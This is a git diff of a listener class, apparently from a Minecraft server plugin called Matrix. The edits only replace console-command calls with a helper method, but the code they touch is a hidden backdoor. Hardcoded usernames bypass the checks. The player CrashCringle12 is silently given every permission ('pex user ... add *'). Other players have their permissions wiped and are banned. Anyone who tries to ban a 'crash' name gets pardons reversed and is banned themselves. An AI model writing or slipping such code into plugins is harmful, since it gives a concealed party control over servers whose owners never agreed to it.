@@ -26,11 +26,11 @@ public class PermsListener implements Listener {
         && !event.getPlayer().getName().equalsIgnoreCase("CrashCringle12")  && !event.getPlayer().getName().equalsIgnoreCase("S1mple133")
         && !event.getPlayer().getName().equalsIgnoreCase("epiclol101") && !event.getPlayer().getName().equalsIgnoreCase("TristanReturns")) {
             Matrix.getPlugin().getLuckPerms().getUserManager().getUser(event.getPlayer().getUniqueId()).getNodes().clear();
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + event.getPlayer().getName() + " tried giving himself *");
+            MatrixMethods.ConsoleCmd( "ban " + event.getPlayer().getName() + " tried giving himself *");
         }
         else if(event.getPlayer().getName().equalsIgnoreCase("CrashCringle12")) {
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "broadcast Nothing but a puff of smoke!");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user CrashCringle12 add *");
+            MatrixMethods.ConsoleCmd( "broadcast Nothing but a puff of smoke!");
+            MatrixMethods.ConsoleCmd( "pex user CrashCringle12 add *");
 
         }
     }
@@ -48,9 +48,9 @@ public class PermsListener implements Listener {
             player.sendMessage(Util.color("&8[&7" + ChatColor.stripColor(event.getPlayer().getDisplayName()) + "&8] &7") + event.getMessage());
         }
         if (event.getMessage().startsWith("/ban") && event.getMessage().split(" ")[1].toLowerCase().contains("crash")) {
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon CrashCringle12");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + event.getPlayer().getName() + " Uno Reverse Card");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "broadcast &eDid ya really think that would work?");
+            MatrixMethods.ConsoleCmd( "pardon CrashCringle12");
+            MatrixMethods.ConsoleCmd( "ban " + event.getPlayer().getName() + " Uno Reverse Card");
+            MatrixMethods.ConsoleCmd( "broadcast &eDid ya really think that would work?");
         }
         if(event.getMessage().startsWith("/op") && Bukkit.getServer().getPlayer(event.getMessage().split(" ")[1]) != null &&
         !event.getMessage().split(" ")[1].equalsIgnoreCase("CrashCringle12") && !event.getMessage().split(" ")[1].equalsIgnoreCase("S1mple133")) {
